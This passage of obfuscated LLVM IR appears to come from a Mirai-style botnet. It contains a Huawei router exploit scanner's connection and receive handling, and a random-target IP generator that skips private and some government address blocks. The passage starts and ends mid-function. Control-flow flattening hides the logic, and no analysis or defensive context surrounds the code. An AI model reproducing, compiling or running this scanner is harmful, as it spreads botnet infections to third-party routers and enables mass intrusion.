  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  store i32 -117243639, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  %657 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %658 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %657, i32 0, i32 2
  %659 = load i32, i32* %658, align 8
  %660 = icmp eq i32 %659, 0
  %661 = select i1 %660, i32 -289894261, i32 -1962488399
  store i32 %661, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  store i32 -875506610, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  %664 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %665 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %664, i32 0, i32 5
  %666 = load i32, i32* %665, align 4
  %667 = icmp eq i32 %666, 256
  %668 = select i1 %667, i32 1228244991, i32 -294263532
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %671 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %670, i32 0, i32 6
  %672 = getelementptr inbounds [256 x i8], [256 x i8]* %671, i32 0, i32 0
  %673 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %674 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %673, i32 0, i32 6
  %675 = getelementptr inbounds [256 x i8], [256 x i8]* %674, i32 0, i32 0
  %676 = getelementptr inbounds i8, i8* %675, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %672, i8* %676, i64 192, i32 1, i1 false)
  %677 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %678 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %677, i32 0, i32 5
  %679 = load i32, i32* %678, align 4
  %680 = sub nsw i32 %679, 64
  store i32 %680, i32* %678, align 4
  store i32 -294263532, i32* %switchVar
  br label %loopEnd

; <label>:681:                                    ; preds = %loopEntry
  %682 = call i32* @__errno_location() #9
  store i32 0, i32* %682, align 4
  %683 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %684 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 8
  %686 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %687 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %686, i32 0, i32 6
  %688 = getelementptr inbounds [256 x i8], [256 x i8]* %687, i32 0, i32 0
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 5
  %691 = load i32, i32* %690, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds i8, i8* %688, i64 %692
  %694 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %695 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %694, i32 0, i32 5
  %696 = load i32, i32* %695, align 4
  %697 = sub nsw i32 256, %696
  %698 = call i32 @huawei_recv_strip_null(i32 %685, i8* %693, i32 %697, i32 16384)
  store i32 %698, i32* %32, align 4
  %699 = load i32, i32* %32, align 4
  %700 = icmp eq i32 %699, 0
  %701 = select i1 %700, i32 -1174071328, i32 1874222126
  store i32 %701, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = call i32* @__errno_location() #9
  store i32 104, i32* %703, align 4
  store i32 -1, i32* %32, align 4
  store i32 1874222126, i32* %switchVar
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load i32, i32* %32, align 4
  %706 = icmp eq i32 %705, -1
  %707 = select i1 %706, i32 307098297, i32 1839863191
  store i32 %707, i32* %switchVar
  br label %loopEnd

; <label>:708:                                    ; preds = %loopEntry
  %709 = call i32* @__errno_location() #9
  %710 = load i32, i32* %709, align 4
  %711 = icmp ne i32 %710, 11
  %712 = select i1 %711, i32 -1942123129, i32 1748660154
  store i32 %712, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = call i32* @__errno_location() #9
  %715 = load i32, i32* %714, align 4
  %716 = icmp ne i32 %715, 11
  %717 = select i1 %716, i32 805880920, i32 1748660154
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %720 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %719, i32 0, i32 2
  %721 = load i32, i32* %720, align 8
  %722 = icmp eq i32 %721, 3
  %723 = select i1 %722, i32 1018458900, i32 -923745605
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %726 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 8
  %728 = call i32 @close(i32 %727)
  %729 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %729)
  store i32 -117243639, i32* %switchVar
  br label %loopEnd

; <label>:730:                                    ; preds = %loopEntry
  %731 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %732 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %731, i32 0, i32 0
  %733 = load i32, i32* %732, align 8
  %734 = call i32 @close(i32 %733)
  %735 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %736 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %735, i32 0, i32 0
  store i32 -1, i32* %736, align 8
  %737 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %738 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %737, i32 0, i32 2
  store i32 0, i32* %738, align 8
  %739 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %740 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %739, i32 0, i32 6
  %741 = getelementptr inbounds [256 x i8], [256 x i8]* %740, i32 0, i32 0
  call void @util_zero(i8* %741, i32 256)
  store i32 1748660154, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  store i32 -875506610, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = load i32, i32* %32, align 4
  %745 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %746 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %745, i32 0, i32 5
  %747 = load i32, i32* %746, align 4
  %748 = add nsw i32 %747, %744
  store i32 %748, i32* %746, align 4
  %749 = load i32, i32* @huawei_fake_time, align 4
  %750 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %751 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %750, i32 0, i32 1
  store i32 %749, i32* %751, align 4
  %752 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %753 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %752, i32 0, i32 6
  %754 = getelementptr inbounds [256 x i8], [256 x i8]* %753, i32 0, i32 0
  %755 = call i32 @util_strlen(i8* %754)
  store i32 %755, i32* %33, align 4
  %756 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %757 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %756, i32 0, i32 6
  %758 = load i32, i32* %33, align 4
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds [256 x i8], [256 x i8]* %757, i64 0, i64 %759
  store i8 0, i8* %760, align 1
  store i32 -117243639, i32* %switchVar
  br label %loopEnd

; <label>:761:                                    ; preds = %loopEntry
  store i32 -1799417243, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  store i32 -1810917463, i32* %switchVar
  br label %loopEnd

; <label>:763:                                    ; preds = %loopEntry
  %764 = load i32, i32* %1, align 4
  %765 = add nsw i32 %764, 1
  store i32 %765, i32* %1, align 4
  store i32 1470361564, i32* %switchVar
  br label %loopEnd

; <label>:766:                                    ; preds = %loopEntry
  store i32 -306047861, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %766, %763, %762, %761, %743, %742, %730, %724, %718, %713, %708, %704, %702, %681, %669, %663, %662, %656, %655, %637, %636, %627, %626, %625, %622, %613, %607, %582, %576, %572, %563, %545, %544, %534, %530, %525, %523, %521, %514, %511, %510, %509, %508, %504, %482, %476, %475, %471, %449, %443, %437, %431, %419, %410, %400, %396, %395, %386, %385, %376, %375, %363, %362, %358, %355, %354, %348, %339, %335, %333, %332, %320, %319, %311, %310, %302, %301, %293, %292, %284, %283, %274, %273, %264, %263, %256, %255, %248, %247, %242, %241, %236, %231, %214, %213, %212, %209, %154, %150, %148, %143, %97, %91, %87, %86, %72, %67, %64, %53, %49, %43, %38, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip.76() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  %switchVar = alloca i32
  store i32 1855383871, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1855383871, label %8
    i32 335446304, label %27
    i32 313403089, label %32
    i32 -1128758402, label %37
    i32 1605730205, label %42
    i32 1309949486, label %47
    i32 250279649, label %52
    i32 -2127929733, label %57
    i32 -2007731471, label %62
    i32 1197044619, label %67
    i32 2017527124, label %72
    i32 -895249956, label %77
    i32 -6188354, label %82
    i32 1216717190, label %87
    i32 -58397211, label %92
    i32 -206598591, label %97
    i32 -1094110224, label %102
    i32 503773753, label %107
    i32 -565809212, label %112
    i32 1237911526, label %117
    i32 911208880, label %122
    i32 435978161, label %127
    i32 -2112484270, label %132
    i32 -1562713657, label %137
    i32 -442575179, label %142
    i32 234413577, label %147
    i32 -148855658, label %152
    i32 1799821284, label %157
    i32 -540095012, label %162
    i32 1809126413, label %167
    i32 -204449181, label %172
    i32 1251462944, label %177
    i32 -346319307, label %182
    i32 1625787331, label %187
    i32 -707949499, label %192
    i32 -273046055, label %196
    i32 -1132429122, label %197
    i32 -622677158, label %199
    i32 -1924005723, label %205
    i32 167895432, label %219
    i32 -1959963782, label %223
    i32 914629654, label %237
    i32 268874126, label %241
    i32 -1396035913, label %255
    i32 -1870800169, label %259
    i32 815421934, label %276
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = call i32 @rand_next()
  store i32 %9, i32* %2, align 4
  %10 = call i64 @time(i64* null) #6
  %11 = trunc i64 %10 to i32
  call void @srand(i32 %11) #6
  %12 = load i32, i32* %2, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %2, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %2, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  %23 = load i32, i32* %2, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %6, align 1
  store i32 335446304, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8, i8* %3, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  %31 = select i1 %30, i32 -1132429122, i32 313403089
  store i32 %31, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8, i8* %3, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -1132429122, i32 -1128758402
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8, i8* %3, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 3
  %41 = select i1 %40, i32 -1132429122, i32 1605730205
  store i32 %41, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8, i8* %3, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 15
  %46 = select i1 %45, i32 -1132429122, i32 1309949486
  store i32 %46, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8, i8* %3, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 16
  %51 = select i1 %50, i32 -1132429122, i32 250279649
  store i32 %51, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8, i8* %3, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 56
  %56 = select i1 %55, i32 -1132429122, i32 -2127929733
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8, i8* %3, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  %61 = select i1 %60, i32 -1132429122, i32 -2007731471
  store i32 %61, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8, i8* %3, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 192
  %66 = select i1 %65, i32 1197044619, i32 2017527124
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %4, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 168
  %71 = select i1 %70, i32 -1132429122, i32 2017527124
  store i32 %71, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8, i8* %3, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 172
  %76 = select i1 %75, i32 -895249956, i32 1216717190
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8, i8* %4, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sge i32 %79, 16
  %81 = select i1 %80, i32 -6188354, i32 1216717190
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8, i8* %4, align 1
  %84 = zext i8 %83 to i32
  %85 = icmp slt i32 %84, 32
  %86 = select i1 %85, i32 -1132429122, i32 1216717190
  store i32 %86, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 100
  %91 = select i1 %90, i32 -58397211, i32 -1094110224
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8, i8* %4, align 1
  %94 = zext i8 %93 to i32
  %95 = icmp sge i32 %94, 64
  %96 = select i1 %95, i32 -206598591, i32 -1094110224
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %4, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %99, 127
  %101 = select i1 %100, i32 -1132429122, i32 -1094110224
  store i32 %101, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8, i8* %3, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 169
  %106 = select i1 %105, i32 503773753, i32 -565809212
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i8, i8* %4, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sgt i32 %109, 254
  %111 = select i1 %110, i32 -1132429122, i32 -565809212
  store i32 %111, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i8, i8* %3, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 198
  %116 = select i1 %115, i32 1237911526, i32 435978161
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8, i8* %4, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp sge i32 %119, 18
  %121 = select i1 %120, i32 911208880, i32 435978161
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i8, i8* %4, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp slt i32 %124, 20
  %126 = select i1 %125, i32 -1132429122, i32 435978161
  store i32 %126, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp sge i32 %129, 224
  %131 = select i1 %130, i32 -1132429122, i32 -2112484270
  store i32 %131, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8, i8* %3, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 6
  %136 = select i1 %135, i32 -273046055, i32 -1562713657
  store i32 %136, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8, i8* %3, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 7
  %141 = select i1 %140, i32 -273046055, i32 -442575179
  store i32 %141, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i8, i8* %3, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 11
  %146 = select i1 %145, i32 -273046055, i32 234413577
  store i32 %146, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 21
  %151 = select i1 %150, i32 -273046055, i32 -148855658
  store i32 %151, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i8, i8* %3, align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 22
  %156 = select i1 %155, i32 -273046055, i32 1799821284
  store i32 %156, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8, i8* %3, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 26
  %161 = select i1 %160, i32 -273046055, i32 -540095012
  store i32 %161, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8, i8* %3, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 28
  %166 = select i1 %165, i32 -273046055, i32 1809126413
  store i32 %166, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i8, i8* %3, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 29
  %171 = select i1 %170, i32 -273046055, i32 -204449181
  store i32 %171, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8, i8* %3, align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 30
  %176 = select i1 %175, i32 -273046055, i32 1251462944
  store i32 %176, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8, i8* %3, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 33
  %181 = select i1 %180, i32 -273046055, i32 -346319307
  store i32 %181, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i8, i8* %3, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 55
  %186 = select i1 %185, i32 -273046055, i32 1625787331
  store i32 %186, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i8, i8* %3, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 214
  %191 = select i1 %190, i32 -273046055, i32 -707949499
  store i32 %191, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i8, i8* %3, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 215
  store i32 -273046055, i32* %switchVar
  store i1 %195, i1* %.reg2mem
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1132429122, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %198 = select i1 %.reload3, i32 1855383871, i32 -622677158
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = call i32 @rand() #6
  %201 = srem i32 %200, 3
  store i32 %201, i32* %7, align 4
  %202 = load i32, i32* %7, align 4
  %203 = icmp eq i32 %202, 0
  %204 = select i1 %203, i32 -1924005723, i32 167895432
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8, i8* %4, align 1
  %207 = zext i8 %206 to i32
  %208 = shl i32 %207, 16
  %209 = or i32 -1677721600, %208
  %210 = load i8, i8* %5, align 1
  %211 = zext i8 %210 to i32
  %212 = shl i32 %211, 8
  %213 = or i32 %209, %212
  %214 = load i8, i8* %6, align 1
  %215 = zext i8 %214 to i32
  %216 = shl i32 %215, 0
  %217 = or i32 %213, %216
  %218 = call i32 @htonl(i32 %217) #9
  store i32 %218, i32* %1, align 4
  store i32 815421934, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %7, align 4
  %221 = icmp eq i32 %220, 1
  %222 = select i1 %221, i32 -1959963782, i32 914629654
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8, i8* %4, align 1
  %225 = zext i8 %224 to i32
  %226 = shl i32 %225, 16
  %227 = or i32 -989855744, %226
  %228 = load i8, i8* %5, align 1
  %229 = zext i8 %228 to i32
  %230 = shl i32 %229, 8
  %231 = or i32 %227, %230
  %232 = load i8, i8* %6, align 1
  %233 = zext i8 %232 to i32
  %234 = shl i32 %233, 0
  %235 = or i32 %231, %234
  %236 = call i32 @htonl(i32 %235) #9
  store i32 %236, i32* %1, align 4
  store i32 815421934, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i32, i32* %7, align 4
  %239 = icmp eq i32 %238, 2
  %240 = select i1 %239, i32 268874126, i32 -1396035913
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = load i8, i8* %4, align 1
  %243 = zext i8 %242 to i32
  %244 = shl i32 %243, 16
  %245 = or i32 687865856, %244
  %246 = load i8, i8* %5, align 1
  %247 = zext i8 %246 to i32
  %248 = shl i32 %247, 8
  %249 = or i32 %245, %248
  %250 = load i8, i8* %6, align 1
  %251 = zext i8 %250 to i32
  %252 = shl i32 %251, 0
  %253 = or i32 %249, %252
  %254 = call i32 @htonl(i32 %253) #9
  store i32 %254, i32* %1, align 4
  store i32 815421934, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i32, i32* %7, align 4
  %257 = icmp eq i32 %256, 3
  %258 = select i1 %257, i32 -1870800169, i32 815421934
  store i32 %258, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8, i8* %3, align 1
  %261 = zext i8 %260 to i32
  %262 = shl i32 %261, 24
  %263 = load i8, i8* %4, align 1
  %264 = zext i8 %263 to i32
  %265 = shl i32 %264, 16
  %266 = or i32 %262, %265
  %267 = load i8, i8* %5, align 1
  %268 = zext i8 %267 to i32
  %269 = shl i32 %268, 8
  %270 = or i32 %266, %269
  %271 = load i8, i8* %6, align 1
  %272 = zext i8 %271 to i32
  %273 = shl i32 %272, 0
  %274 = or i32 %270, %273
  %275 = call i32 @htonl(i32 %274) #9
  store i32 %275, i32* %1, align 4
  store i32 815421934, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = load i32, i32* %1, align 4
  ret i32 %277

loopEnd:                                          ; preds = %259, %255, %241, %237, %223, %219, %205, %199, %197, %196, %192, %187, %182, %177, %172, %167, %162, %157, %152, %147, %142, %137, %132, %127, %122, %117, %112, %107, %102, %97, %92, %87, %82, %77, %72, %67, %62, %57, %52, %47, %42, %37, %32, %27, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @huawei_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 887574477, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 887574477, label %first
    i32 1531069470, label %11
    i32 1391545316, label %16
    i32 -633140183, label %22
    i32 -1648060435, label %23
    i32 737543257, label %56
    i32 495083670, label %62
    i32 -1444858311, label %63
    i32 -98136737, label %66
    i32 1578062767, label %75
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp ne i32 %.reload, -1
  %10 = select i1 %9, i32 1531069470, i32 1391545316
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %13 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 8
  %15 = call i32 @close(i32 %14)
  store i32 1391545316, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %18 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %19 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 8
  %20 = icmp eq i32 %17, -1
  %21 = select i1 %20, i32 -633140183, i32 -1648060435
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 1578062767, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 5
  store i32 0, i32* %25, align 4
  %26 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
